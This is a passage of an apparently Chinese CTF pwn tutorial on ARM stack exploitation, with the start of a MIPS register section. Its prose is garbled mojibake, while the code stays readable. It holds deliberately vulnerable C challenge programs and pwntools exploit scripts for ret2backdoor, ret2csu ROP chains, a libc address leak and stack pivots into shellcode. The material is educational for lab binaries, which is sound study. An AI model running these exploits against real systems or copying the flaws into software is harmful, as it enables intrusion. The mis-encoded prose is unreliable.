ä¸Šxï¼Œxä¸ºæ­£æ•°\n\nè€ŒXåˆ™åœ¨ä¸åŒçš„CPUä½æ•°ä¸‹ä¸åŒï¼Œ32ä¸º4ï¼Œ64åˆ™ä¸º8ã€‚\n\næ­¤å¤–å †æ ˆçš„å¢é•¿æ–¹å‘å¯ä»¥ä¸åŒï¼Œä¹Ÿå¯ä»¥åœ¨ä¸åŒæƒ…å½¢ä¸‹ä½œä¸ºåç¼€ï¼Œæ•ˆæœä¸€æ ·çš„\n\n- FD(Full Descent)ï¼šæ»¡é€’å‡å †æ ˆ\n- FA(Full Ascent)ï¼šæ»¡é€’å¢å †æ ˆ\n- ED(Empty Descent)ï¼šç©ºé€’å‡å †æ ˆ\n- EA(Empty Ascent)ï¼šç©ºé€’å¢å †æ ˆ\n\næ»¡åˆ™ä»£è¡¨æ ˆæŒ‡é’ˆæŒ‡å‘æ ˆé¡¶ï¼Œç©ºåˆ™ä»£è¡¨æ ˆæŒ‡é’ˆä¸æŒ‡å‘æ ˆé¡¶\n\n### (3)è·³è½¬æŒ‡ä»¤\n\n#### â‘ åˆ†æ”¯è·³è½¬(Branch)\n\n##### B\n\næ— æ¡ä»¶è·³è½¬\n\n##### BX \\<Rm\\>\n\nç”±å¯„å­˜å™¨ç»™å‡ºåœ°å€\n\nè‹¥ Rm çš„ bit[0] ä¸º1ï¼Œåˆ‡æ¢åˆ° Thumb æŒ‡ä»¤æ‰§è¡Œï¼›\n\nè‹¥ Rm çš„ bit[0] ä¸º0ï¼Œåˆ‡æ¢åˆ° ARM æŒ‡ä»¤æ‰§è¡Œã€‚\n\n##### BL\n\nç±»ä¼¼äºCallï¼Œä¼šå­˜å…¥è¿”å›åœ°å€åˆ°LRå¯„å­˜å™¨\n\n##### BLX/BLR\n\nå³ç±»ä¼¼å¯¹åº”ç»„åˆ\n\n#### â‘¡æ¡ä»¶è·³è½¬\n\nä¾æ®CPSRå¯„å­˜å™¨ä¸‹çš„ALUçŠ¶æ€æ ‡å¿—ä½\n\nCPSRå¯„å­˜å™¨åŒ…å«ä¸‹é¢çš„ALUçŠ¶æ€æ ‡å¿—ï¼š\n\nã€€ã€€Nã€€ Set when the result of the operation was Negative(ç»“æœä¸ºè´Ÿæ•°)\n\nã€€ã€€Z\tSet when the result of the operation was Zero(ç»“æœä¸º0)\n\nã€€ã€€C\tSet when the operation result in a Carry(å‘ç”Ÿè¿›ä½ï¼Œæˆ–å€Ÿä½)\n\nã€€ã€€V\tSet when the operation caused oVerflow(æ“ä½œé€ æˆæº¢å‡º)\n\nã€€ã€€Q\tARM architecture v5E only sticky flag\n\nè¿˜æœ‰BEQã€BNE\n\n\n\n## 2.éå¶å­å‡½æ•°æº¢å‡º\n\n### (1)æ ˆæ¨¡å‹\n\n```\n#æ³¨é‡Šå¤´\n\n+-------------+\n|             |\n|  padding    |\n+-------------+\n| \tLast FP   | \n+-------------+\n| return_addr |<- frame pointer\n+-------------+\n```\n\nå…ˆå‹å…¥LRï¼Œå†å‹å…¥FPï¼Œå½“å‰çš„FPæŒ‡é’ˆæŒ‡å‘çš„å†…å®¹ä¸ºLRä¿å­˜çš„è¿”å›åœ°å€\n\n![image-20211103144720968](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211103144726.png)\n\n### (2)é¢˜ç›®ï¼š\n\n```C\n#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n\nchar bss[0x50];\n\nvoid backdoor()\n{\n    system(\"/bin/bash\");\n}\n\nvoid myFunc()\n{\n    char name[16];\n    printf(\"Please input your name:\");\n    read(0,name,0x100);\n    printf(\"Hello! \");\n    printf(name);\n}\n\nint main(int argc, char *argv[]) {\n\n    setvbuf(stdout, 0, 2, 0);\n    setvbuf(stdin, 0, 2, 0);\n    \n    system(\"echo 'PIG-007!'\");\n    puts(\"Welcome to my world!I am PIG-007!\");\n    myFunc();\n    return 0;\n\n}\n\n\n```\n\n### (3)åˆ©ç”¨ï¼š\n\nä¸€èˆ¬è€Œè¨€éƒ½æ˜¯ä¸å­˜åœ¨PIEçš„\n\n#### A.åé—¨\n\n```python\nbackDoor = 0x1050C\n\nfake_FP = 0xdeadbeef\npayload = \"A\"*0x10\npayload += p32(fake_FP)\npayload += p32(backDoor)\n\n#mulArchDbg()\np.sendline(payload)\n#pause()\np.interactive()\n```\n\n#### B.ROPé“¾æ¡\n\n##### ğŸ”ºæ³¨æ„ï¼š\n\nä¸çŸ¥é“ä¸ºå•¥ï¼Œåœ¨æˆ‘çš„GDBè°ƒè¯•æ—¶ï¼Œæ‰“å°å‡ºæ¥çš„å‡½æ•°åœ°å€å’ŒçœŸå®çš„å‡½æ•°åœ°å€ä¸ä¸€æ ·ï¼š\n\n![image-20211104115041178](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211104115048.png)\n\nä¸Šé¢0x2101cæ˜¯systemçš„gotè¡¨åœ°å€ï¼Œå¯æ˜¯å’ŒGDBæ‰“å°çš„å‡½æ•°åœ°å€ä¸ä¸€æ ·ï¼Œä½†æ˜¯å®é™…ä¸Šlibc.soæ–‡ä»¶æ²¡ä»€ä¹ˆé—®é¢˜ï¼Œå› ä¸ºå¯ä»¥æ­£å¸¸getshellã€‚ä¹‹åå’¨è¯¢äº†luckyå¸ˆå‚…ä¹‹åï¼Œåœ¨å®¤å‹çš„å¸®åŠ©ä¸‹ï¼Œç¼–è¯‘äº†å„ä¸ªç‰ˆæœ¬çš„armæ¶æ„ä¸‹çš„glibcï¼Œå†é€šè¿‡qemuåŠ è½½è¿è¡Œåº“å°±æ­£å¸¸äº†ã€‚\n\n##### åŠ«æŒæ ˆæ¨¡å‹ï¼š\n\n```\n+-------------+\n|             |\n|  padding    |\n+-------------+\n|  Last FP    | \n+-------------+\n|gadgets_addr | <- frame pointer(return_addr)\n+-------------+\n```\n\n##### A.æº¢å‡ºå­—èŠ‚ä¸å—é™åˆ¶\n\n###### a.å­˜åœ¨`pop {r0,*, pc}`\n\nå½“æœ‰`pop {r0,*, pc}`è¿™ç§gadgetï¼Œå½“ç„¶å°±æ˜¯æƒ³æ€ä¹ˆç”¨å°±æ€ä¹ˆç”¨ï¼Œä½†æ²¡æœ‰çš„æ—¶å€™å¯ä»¥ç”¨å¸¸è§çš„CSUæ¥æ›¿ä»£ã€‚\n\n###### b.åˆ©ç”¨csu\n\n```\n#æ³¨é‡Šå¤´\n\n.text:0001049C                 LDR     R3, [R5],#4                 â‘¡\n.text:000104A0                 MOV     R2, R9\n.text:000104A4                 MOV     R1, R8\n.text:000104A8                 MOV     R0, R7\n.text:000104AC                 BLX     R3                          â‘¢\n.text:000104B0                 CMP     R6, R4\n.text:000104B4                 BNE     loc_10498\n.text:000104B8                 LDMFD   SP!, {R4-R10,PC}            â‘ \n```\n\nè¿™é‡Œå°±æ˜¯å¾ˆæ­£å¸¸çš„ï¼Œé€šè¿‡â‘ æ¥ä¸ºR4-R10èµ‹å€¼ï¼Œä»¥åŠæ§åˆ¶PCè·³è½¬åˆ°â‘¡ï¼Œå†åˆ©ç”¨R5åœ°å€å¯¹åº”çš„å€¼æ¥èµ‹å€¼ç»™R3å¯¹åº”è·³è½¬ï¼ŒæœŸé—´ä¹Ÿå¯é€šè¿‡R7-R8æ¥æ§åˆ¶R0-R2çš„å‚æ•°ã€‚è¿™é‡Œéœ€è¦æ»¡è¶³R5å¤„ä¿å­˜çš„æ˜¯gotè¡¨åœ°å€ï¼Œå³å°†R5èµ‹å€¼ä¸ºfunc_got_addrå³å¯ã€‚\n\n```python\ndef arm_csu(call,u_gadget1,u_gadget2,r0,r1,r2):\n    payload = p32(u_gadget1)\n    payload += p32(0)\n    payload += p32(call) #[r5]->r3  blx r3\n    payload += p32(0)\n    payload += p32(r0)\n    payload += p32(r1)\n    payload += p32(r2)\n    payload += p32(0)\n    payload += p32(u_gadget2)\n    return payload\n\nu_gadget1 = elf.sym['__libc_csu_init'] + 0x54\nu_gadget2 = elf.sym['__libc_csu_init'] + 0x38\n\nfake_FP = start_addr\npayload = \"A\"*0x10\npayload += p32(fake_FP)\npayload += arm_csu(system_got,u_gadget1,u_gadget2,binsh_addr,0,0)\npayload += p32(0)*7\npayload += p32(start_addr)\np.sendline(payload)\np.interactive()\n```\n\n\n\nè¿™ä¸ªæ˜¯åŸºäºè°ƒç”¨äº†systemå‡½æ•°ï¼Œæ‰€ä»¥systemå‡½æ•°ä¸­çš„Gotè¡¨ä¸­å·²ç»æœ‰äº†å‡½æ•°åœ°å€ï¼ŒåŒæ ·çš„ï¼Œå½“æ²¡æœ‰æ—¶éœ€è¦æ³„éœ²åœ°å€ï¼Œé€šå¸¸è°ƒç”¨putså‡½æ•°æˆ–è€…printfå‡½æ•°å³å¯æ³„éœ²åœ°å€ï¼Œå¦‚ä¸‹ç›¸å…³è„šæœ¬\n\n```\nfake_FP = start_addr\npayload = \"A\"*0x10\npayload += p32(fake_FP)\npayload += arm_csu(printf_got,u_gadget1,u_gadget2,printf_got,0,0)\npayload += p32(0)*7\npayload += p32(start_addr)\n#mulArchDbg()\np.sendline(payload)\nprintf_addr = u32Leakbase(0)\nlibc.address = printf_addr - libc.sym['printf']\nsystem_addr = libc.sym['system']\nbinsh_addr = libc.search('/bin/sh').next()\nlg(\"system_addr\",system_addr)\nlg(\"binsh_addr\",binsh_addr) \n```\n\næ§åˆ¶è¿”å›åœ°å€è¿›å…¥u_gadget1\n\n![image-20211105110402858](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211105110403.png)\n\nç„¶åæ§åˆ¶R4~R10å¯„å­˜å™¨ï¼Œè·³è½¬u_gadget2\n\n![image-20211105110734269](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211105110734.png)\n\nç„¶åè·³è½¬gotè¡¨ä¸­å‡½æ•°\n\n![image-20211105110946942](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211105110947.png)\n\nè¿™é‡Œåœ¨è°ƒç”¨CSUæ—¶ä¹Ÿéœ€è¦æ§åˆ¶R6å’ŒR4ï¼Œä¾æ®`CMP     R6, R4`ï¼Œä½¿å¾—ä¹‹åçš„`BNE     loc_10624`çŸ­è·³è½¬ä¸æˆç«‹ï¼Œè¿›å…¥åˆ°csuä¸­çš„æœ€åçš„`POP     {R4-R10,PC}`è¯­å¥ï¼Œè¿™æ—¶å€™å†å°†æ ˆæ§å¥½ï¼Œå°±èƒ½è¿”å›åˆ°startå‡½æ•°é‡æ–°å¼€å§‹äº†ã€‚\n\n![image-20211105112027065](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211105112027.png)\n\nç°åœ¨çš„æ ˆåœ¨æˆ‘ä»¬æœ€å¼€å§‹çš„æ—¶å€™å·²ç»é€šè¿‡ä»¥ä¸‹è¯­å¥æ§åˆ¶å¥½äº†ï¼Œpopä¹‹åå³å¯æ§åˆ¶pcè¿›å…¥startå‡½æ•°é‡æ–°å¼€å§‹ã€‚\n\n```\npayload += p32(0)*7\npayload += p32(start_addr)\n```\n\næ³„éœ²åœ°å€ä¹‹åï¼Œå¦‚æœç¨‹åºä¸­æ²¡æœ‰è°ƒç”¨systemï¼Œé‚£ä¹ˆä¾ç„¶ä¹Ÿæ— æ³•é€šè¿‡ret2csuæ¥getshellï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡ä¸‹åˆ—çš„æ¥ä»£æ›¿ï¼š\n\n```\npop {r4, r5, r6, r7, r8, sb, sl, pc} \t#pop_R4_R10_PC\npop {r3, pc} \t\t\t\t\t\t\t#pop_r3_pc\nmov r0, r7 ; blx r3\t\t\t\t\t\t#movR0_R7_BLR3\n```\n\nè€Œ`pop_R4_R10_PC`å’Œ`movR0_R7_BLR3`éƒ½æ˜¯csuä¸­çš„ï¼Œ`pop_r3_pc`åˆ™éå¸¸å¸¸ç”¨ï¼ŒåŸºæœ¬éƒ½æœ‰ã€‚\n\nè¿™ä¸ªå°±æ˜¯å…ˆæ§R7ï¼Œåœ¨æ§R3ï¼Œæœ€åR7èµ‹ç»™R0ï¼Œè·³è½¬R3è°ƒç”¨æƒ³è°ƒç”¨çš„å‡½æ•°ï¼Œè¿™é‡Œå°±æ˜¯`system('/bin/sh')`ã€‚\n\n```python\nfake_FP = start_addr\npayload = \"A\"*0x10\npayload += p32(fake_FP)\npayload += p32(pop_R4_R10_PC)\npayload += p32(0)\t\t\t\t#r4\npayload += p32(0)\t\t\t\t#r5\npayload += p32(0) \t\t\t\t#r6\npayload += p32(binsh_addr)      #r7\npayload += p32(0)\t\t\t\t#r8\npayload += p32(0)\t\t\t\t#r9\npayload += p32(0)\t\t\t\t#r10\npayload += p32(pop_r3_pc)      \t#r3\npayload += p32(system_addr)\npayload += p32(movR0_R7_BLR3)\n```\n\nè¿™é‡Œçš„systemå‡½æ•°åœ°å€å°±å¾—æ˜¯æ³„éœ²çš„çœŸå®åœ°å€äº†ï¼Œå› ä¸ºèµ‹å€¼è¿‡ç¨‹æ˜¯ç›´æ¥å¯„å­˜å™¨èµ‹å€¼ï¼Œè€Œä¸æ˜¯å–å¯„å­˜å™¨å€¼ä¸ºåœ°å€å†å–å€¼äº†ã€‚\n\nè¿™é‡Œçš„fake_FPåŸºæœ¬æ²¡æœ‰ä»€ä¹ˆç”¨ï¼Œä½†æ˜¯ä¸‹é¢ä»‹ç»çš„å°±ä¼šæœ‰ç”¨äº†ã€‚\n\n##### B.æº¢å‡ºå­—èŠ‚å—åˆ°é™åˆ¶\n\nå½“æº¢å‡ºå­—èŠ‚å—åˆ°é™åˆ¶ï¼Œæ¯”å¦‚åªèƒ½æº¢å‡º0x10ä¸ªå­—èŠ‚æ—¶ã€‚\n\nå‚ç…§inctf2018-warmupé¢˜ç›®\n\n###### a.åˆ©ç”¨readå‡½æ•°+shellcode\n\nå½“è°ƒç”¨äº†readå‡½æ•°æ—¶ï¼Œä¸”è¯¥armæ¶æ„ä½¿ç”¨qemuæ¨¡æ‹Ÿï¼Œé‚£ä¹ˆbssæ®µåŸºæœ¬éƒ½æ˜¯å¯æ‰§è¡Œçš„ã€‚(å…·ä½“åŸå› æœªçŸ¥)\n\né‚£ä¹ˆè°ƒç”¨readå‡½æ•°ä¸€èˆ¬éƒ½æ˜¯å¦‚ä¸‹ï¼š\n\n```\n.text:00010540                 MOV     R2, #0x100      ; nbytes\n.text:00010544                 MOV     R1, R3          ; buf\n.text:00010548                 MOV     R0, #0          ; fd\n.text:0001054C                 BL      read\n```\n\nè¿™é‡Œå°±å¯ä»¥é€šè¿‡èµ‹å€¼ç»™bufçš„è¯­å¥æ¥åŠ«æŒR1ï¼Œå°†shellcodeè¯»å–åˆ°æˆ‘ä»¬æƒ³æ”¾ç½®çš„ä½ç½®ï¼Œå½“ç„¶ï¼Œè¿™ä¹‹å‰è¿˜æ˜¯å¾—åŠ«æŒR3å¯„å­˜å™¨ï¼Œä¸è¿‡è¿™ä¸ªç›´æ¥é€šè¿‡å¾ˆå¸¸ç”¨çš„gadgetå³å¯ã€‚\n\n```\npop {r3, pc} \t\t\t\t\t\t\t#pop_r3_pc\n```\n\né‚£ä¹ˆå¦‚ä¸‹æ‰€ç¤º\n\n```python\nshellcode_addr = bss_addr + 0x4\nfake_FP = bss_addr\npayload = \"A\"*0x10\npayload += p32(fake_FP)\npayload += p32(pop_r3_pc)\npayload += p32(bss_addr)\npayload += p32(read_gadget)\n#mulArchDbg()\np.sendline(payload)\nsleep(1)\np.sendline(p32(shellcode_addr)+shellcode)\n#pause()\np.interactive()\n```\n\n![image-20211105115257258](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211105115257.png)\n\nè¿™æ ·å³å¯è¯»å–shellcodeåˆ°bssæ®µäº†\n\n![image-20211105115432342](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211105115432.png)\n\nä¸è¿‡è¿™ä¹Ÿéœ€è¦åŸæœ¬çš„è¯»å–å‡½æ•°è®¾ç½®çš„bufé•¿åº¦è¶³å¤Ÿæ”¾ä¸‹æˆ‘ä»¬çš„shellcodeæ‰è¡Œï¼Œå·²ç»æˆåŠŸè¯»å–\n\n![image-20211105115637472](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211105115637.png)\n\nè¿™é‡Œçš„fake_FPå°±èµ·ä½œç”¨äº†ï¼Œå› ä¸ºæˆ‘ä»¬åŠ«æŒäº†FPï¼Œæ‰€ä»¥åœ¨myFuncå‡½æ•°ï¼Œå³å­˜åœ¨æº¢å‡ºå‡½æ•°è¿”å›æ—¶ï¼Œé€šè¿‡\n\n`SUB     SP, R11, #4`å°†FPå‡4ä¹‹åèµ‹å€¼ç»™SPï¼Œå°±èƒ½åŠ«æŒæ ˆäº†ï¼Œ\n\n![image-20211105120320963](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211105120321.png)\n\nä¹‹åå†é€šè¿‡`POP     {R11,PC}`ï¼ŒåŠ«æŒPCï¼Œè¿›å…¥åˆ°shellcodeæ‰§è¡Œã€‚éœ€è¦æ³¨æ„çš„æ˜¯è¿™é‡Œç”±äºæ˜¯popç»™PCï¼Œæ‰€ä»¥bssæ®µä¸Šè¿˜æ˜¯éœ€è¦æ”¾ä¸Šå¯¹åº”shellcodeå¤„çš„åœ°å€ï¼Œæ‰€ä»¥å‘é€shellcodeçš„è¯­å¥ä¸º\n\n```python\np.sendline(p32(shellcode_addr)+shellcode)\n```\n\næœ€åæˆåŠŸgetshellã€‚\n\n#### ğŸ”ºå­˜åœ¨PIEæ—¶\n\nè¿™ç§ä¸€èˆ¬éƒ½æ˜¯éœ€è¦ç»“åˆçˆ†ç ´æ¥è¿›è¡Œäº†ï¼Œæˆ–è€…é¢˜ç›®æœ¬èº«æ³„éœ²åœ°å€ã€‚\n\n\n\n\n\n## 3.å¶å­å‡½æ•°æº¢å‡º\n\n### (1)æ ˆæ¨¡å‹\n\n```\n#æ³¨é‡Šå¤´\n\n+-------------+\n|             |\n|  padding    |\n+-------------+\n|  Last FP    | <- frame pointer\n+-------------+\n```\n\nä½†æ˜¯è¿™æ ·å°±ä¸å¥½åˆ©ç”¨ï¼Œåªèƒ½åŠ«æŒåˆ°ä¸Šä¸€å±‚å‡½æ•°çš„å‡½æ•°æ ˆï¼Œé‚£ä¹ˆé€šå¸¸ä¼šå°è¯•åŠ«æŒæ ˆè¿ç§»ä¸€æ®µè·ç¦»ï¼Œä½¿å¾—ä¸Šä¸€ä¸ªéå¶å­å‡½æ•°çš„å‰©ä¸‹çš„æ±‡ç¼–ä»£ç æ‰€ç”¨åˆ°çš„æ ˆä¸Šæ•°æ®æ˜¯æˆ‘ä»¬ä¼ªé€ çš„æ ˆä¸­çš„æ•°æ®ï¼Œè¿™æ ·å°±èƒ½å®ŒæˆåŠ«æŒä¸Šä¸€ä¸ªéå¶å­å‡½æ•°çš„è¿”å›åœ°å€ã€‚\n\n### (2)é¢˜ç›®ï¼š\n\n```C\n#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n\nchar bss[0x100];\n\nvoid backdoor()\n{\n    system(\"/bin/bash\");\n}\n\nvoid myFunc(char* nameSrc,int amount,int* i)\n{\n    char name[16];\n\n    while(1)\n    {\n        name[i[0]] = nameSrc[i[0]];\n        i[0] = i[0] + 1;\n        if( i[0] == amount)\n            break;\n    }\n}\n\nint main(int argc, char *argv[]) {\n\n    int i[2] = {0,0};\n    setvbuf(stdout, 0, 2, 0);\n    setvbuf(stdin, 0, 2, 0);\n\n    system(\"echo 'PIG-007!'\");\n    puts(\"Welcome to my world!I am PIG-007!\");\n    printf(\"Please input your name:\");\n    read(0,bss,0x100);\n    printf(\"Hello! \");\n    printf(bss);\n    myFunc(bss,strlen(bss),i);\n    return 0;\n}\n```\n\n### (3)åˆ©ç”¨ï¼š\n\nç›´æ¥åŠ«æŒLast FPï¼Œç„¶ååˆ©ç”¨ä¸Šä¸€å±‚å‡½æ•°è¿”å›æ—¶åŠ«æŒæ ˆï¼Œåœ¨æ ˆä¸Šä¿å­˜shellcodeåœ°å€ï¼Œç›´æ¥è¿›å…¥shellcodeå³å¯getshellã€‚\n\n```python\nshellcode_addr =  bss_addr + 0x20\npayload = \"\"\npayload += \"A\"*0x14\npayload += p32(bss_addr + 0x18)\npayload += p32(bss_addr + 0x18)\npayload += p32(shellcode_addr)\npayload += shellcode\n\n#mulArchDbg()\np.sendline(payload)\n#pause()\np.interactive()\n```\n\npop {fp}ä¹‹åå·²ç»åŠ«æŒæ ˆåˆ°bssæ®µä¸Šäº†\n\n![image-20211106220025308](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211106220032.png)\n\nè¿”å›mainå‡½æ•°ä¹‹åï¼Œåˆ©ç”¨mainå‡½æ•°ä¸­çš„è¿”å›æŒ‡ä»¤`sub sp,fp,#4`å®Œæˆæ ˆåŠ«æŒ\n\n![image-20211106220242850](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211106220242.png)\n\nç„¶åå°±åˆ©ç”¨`pop {fp, pc}`æ¥åŠ«æŒè¿”å›åœ°å€ï¼Œè¿›å…¥åˆ°æˆ‘ä»¬è¾“å…¥çš„bssæ®µä¸Šshellcodeçš„åœ°æ–¹\n\n![image-20211106221534722](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211106221534.png)\n\n#### æ³¨ï¼š\n\nä¸åœ¨bssæ®µä¸Šæ—¶ï¼Œæˆ‘ä»¬åŠ«æŒå®ŒLast FPï¼Œè¿”å›ä¸Šä¸€å±‚å‡½æ•°æ ˆä¸­æ—¶ï¼Œå½“æº¢å‡ºé•¿åº¦è¶³å¤Ÿï¼Œå¯ç›´æ¥ä¿®æ”¹ä¸Šä¸€å±‚å‡½æ•°æ ˆä¸­çš„æ•°æ®ï¼Œç›¸å½“äºå°±æ˜¯éå¶å­å‡½æ•°çš„æº¢å‡ºäº†ã€‚\n\nè‡³äºæº¢å‡ºé•¿åº¦ä¸å¤Ÿï¼Œåªèƒ½åŠ«æŒLast FPçš„æ—¶å€™ï¼Œåˆæ— æ³•æ³„éœ²åœ°å€ï¼Œæ„Ÿè§‰ä¸å¤ªèƒ½æï¼Œæˆ–è€…ä¸Šä¸Šä¸€å±‚å‡½æ•°ä¸­æœ‰å‰©ä¸‹å¯åˆ©ç”¨çš„æ•°æ®ï¼Œé‚£ä¹ˆå°±éƒ¨åˆ†åŠ«æŒLast FPï¼Œåˆ©ç”¨ä¸Šä¸Šä¸€å±‚å‡½æ•°ä¸­å‰©ä¸‹çš„æ±‡ç¼–æ¥getshellï¼Œè¿™ä¸ªå…·ä½“çœ‹é¢˜ç›®ã€‚\n\n\n\n## 4.æ ¼å¼åŒ–å­—ç¬¦ä¸²\n\narmæ¶æ„ä¸‹çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ³„éœ²çš„é¡ºåºæ˜¯R1,R2,R3,æ ˆï¼Œå…¶ä»–çš„ç›¸å…³åˆ©ç”¨æ–¹å¼ä¹Ÿæ˜¯ç±»ä¼¼ï¼Œä¸å†å¤šè¯´ã€‚\n\n## 5.å †\n\nå †çš„åˆ©ç”¨æ–¹æ³•ä¹Ÿæ˜¯ç±»ä¼¼çš„ã€‚\n\n\n\n\n\nå‚è€ƒï¼š\n\n[ARMæ¶æ„ä¸‹çš„ Pwn çš„ä¸€èˆ¬è§£å†³æ€è·¯ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)](https://www.anquanke.com/post/id/199112#h3-20)\n\n\n\n\n\n# ä¸‰ã€MIPS\n\nä¸»è¦ä»‹ç»mipselæ¶æ„çš„ï¼Œå°ç«¯åºï¼Œå¤§ç«¯çš„mipså¾ˆå°‘è€ƒåˆ°ï¼Œè€Œä¸”ä¹ŸåŸºæœ¬éƒ½æ˜¯å¤§åŒå°å¼‚\n\n## 1.å¯„å­˜å™¨å…³ç³»\n\n| REGISTER | NAME      | USAGE                                                        |\n| :------- | :-------- | :----------------------------------------------------------- |\n| $0       | $zero     | å¸¸é‡0(constant value 0)                                      |\n| $1       | $at       | ä¿ç•™ç»™æ±‡ç¼–å™¨(Reserved for assembler)                         |\n| $2-$3    | $v0 - $v1 | å‡½æ•°è°ƒç”¨è¿”å›å€¼(values for results and expression evaluation) |\n| $4-$7    | $a0-$a3   | å‡½æ•°è°ƒç”¨å‚æ•°(arguments)                                      |\n| $8-$15   | $t0-$t7   | æš‚æ—¶çš„(æˆ–éšä¾¿ç”¨çš„)                                           |\n| $16-$23  | $s0-$s7   | ä¿å­˜çš„(æˆ–å¦‚æœç”¨ï¼Œéœ€è¦SAVE/RESTOREçš„)(saved)                  |\n| $24-$25  | $t8-$t9   | æš‚æ—¶çš„(æˆ–éšä¾¿ç”¨çš„)                                           |\n| $28      | $gp       | å…¨å±€æŒ‡é’ˆ(Global Pointer)                                     |\n| $29      | $sp       | å †æ ˆæŒ‡é’ˆ(Stack Pointer)                                      |\n| $30      | $fp       | å¸§æŒ‡é’ˆ(Frame Pointer)                                        |\n\nè¯´æ˜\n\n- $0\n\nå³$zero,è¯¥å¯„å­˜å™¨æ€»æ˜¯è¿”å›é›¶ï¼Œä¸º0è¿™ä¸ªæœ‰ç”¨å¸¸æ•°æä¾›äº†ä¸€ä¸ªç®€æ´çš„ç¼–ç å½¢å¼ã€‚\n\n```mipsasm\nmove $t0,$t1\n#å®é™…ä¸º  \nadd $t0,$0,$t1\n```\n\nä½¿ç”¨ä¼ªæŒ‡ä»¤å¯ä»¥ç®€åŒ–ä»»åŠ¡ï¼Œæ±‡ç¼–ç¨‹åºæä¾›äº†æ¯”ç¡¬ä»¶æ›´ä¸°å¯Œçš„æŒ‡ä»¤é›†ã€‚\n\n- $1\n\nå³ $atï¼Œè¯¥å¯„å­˜å™¨ä¸ºæ±‡ç¼–ä¿ç•™ï¼Œç”±äºIå‹æŒ‡ä»¤çš„ç«‹å³æ•°å­—æ®µåªæœ‰16ä½ï¼Œåœ¨åŠ è½½å¤§å¸¸æ•°æ—¶ï¼Œç¼–è¯‘å™¨æˆ–æ±‡ç¼–ç¨‹åºéœ€è¦æŠŠå¤§å¸¸æ•°æ‹†å¼€ï¼Œç„¶åé‡æ–°ç»„åˆåˆ°å¯„å­˜å™¨é‡Œã€‚æ¯”å¦‚åŠ è½½ä¸€ä¸ª32ä½ç«‹å³æ•°éœ€è¦ `lui`ï¼ˆè£…å…¥é«˜ä½ç«‹å³æ•°ï¼‰å’Œ`addi`ä¸¤æ¡æŒ‡ä»¤ã€‚åƒMIPSç¨‹åºæ‹†æ•£å’Œé‡è£…å¤§å¸¸æ•°ç”±æ±‡ç¼–ç¨‹åºæ¥å®Œæˆï¼Œæ±‡ç¼–ç¨‹åºå¿…éœ€ä¸€ä¸ªä¸´æ—¶å¯„å­˜å™¨æ¥é‡ç»„å¤§å¸¸æ•°ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºæ±‡ç¼–ä¿ç•™$atçš„åŸå› ä¹‹ä¸€ã€‚\n\n- $2..$3:($v0-$v1)\n\nç”¨äºå­ç¨‹åºçš„éæµ®ç‚¹ç»“æœæˆ–è¿”å›å€¼ï¼Œå¯¹äºå­ç¨‹åºå¦‚ä½•ä¼ é€’å‚æ•°åŠå¦‚ä½•è¿”å›ï¼ŒMIPSèŒƒå›´æœ‰ä¸€å¥—çº¦å®šï¼Œå †æ ˆä¸­å°‘æ•°å‡ ä¸ªä½ç½®å¤„çš„å†…å®¹è£…å…¥CPUå¯„å­˜å™¨ï¼Œå…¶ç›¸åº”å†…å­˜ä½ç½®ä¿ç•™æœªåšå®šä¹‰ï¼Œå½“è¿™ä¸¤ä¸ªå¯„å­˜å™¨ä¸å¤Ÿå­˜æ”¾è¿”å›å€¼æ—¶ï¼Œç¼–è¯‘å™¨é€šè¿‡å†…å­˜æ¥å®Œæˆã€‚\n\n- $4..$7:($a0-$a3)\n\nç”¨æ¥ä¼ é€’å‰å››ä¸ªå‚æ•°ç»™å­ç¨‹åºï¼Œä¸å¤Ÿçš„ç”¨å †æ ˆã€‚a0-a3å’Œv0-v1ä»¥åŠraä¸€èµ·æ¥æ”¯æŒå­ç¨‹åºï¼è¿‡ç¨‹è°ƒç”¨ï¼Œåˆ†åˆ«ç”¨ä»¥ä¼ é€’å‚æ•°ï¼Œè¿”å›ç»“æœå’Œå­˜æ”¾è¿”å›åœ°å€ã€‚å½“éœ€è¦ä½¿ç”¨æ›´å¤šçš„å¯„å­˜å™¨æ—¶ï¼Œå°±éœ€è¦å †æ ˆï¼ˆstack)äº†,MIPSç¼–è¯‘å™¨æ€»æ˜¯ä¸ºå‚æ•°åœ¨å †æ ˆä¸­ç•™æœ‰ç©ºé—´ä»¥é˜²æœ‰å‚æ•°éœ€è¦å­˜å‚¨ã€‚\n\n- $8..$15:($t0-$t7)\n\nä¸´æ—¶å¯„å­˜å™¨ï¼Œå­ç¨‹åºå¯ä»¥ä½¿ç”¨å®ƒä»¬è€Œä¸ç”¨ä¿ç•™ã€‚\n\n- $16..$23:($s0-$s7)\n\nä¿å­˜å¯„å­˜å™¨ï¼Œåœ¨è¿‡ç¨‹è°ƒç”¨è¿‡ç¨‹ä¸­éœ€è¦ä¿ç•™ï¼ˆè¢«è°ƒç”¨è€…ä¿å­˜å’Œæ¢å¤ï¼Œè¿˜åŒ…æ‹¬$fpå’Œ$raï¼‰ï¼ŒMIPSæä¾›äº†ä¸´æ—¶å¯„å­˜å™¨å’Œä¿å­˜å¯„å­˜å™¨ï¼Œè¿™æ 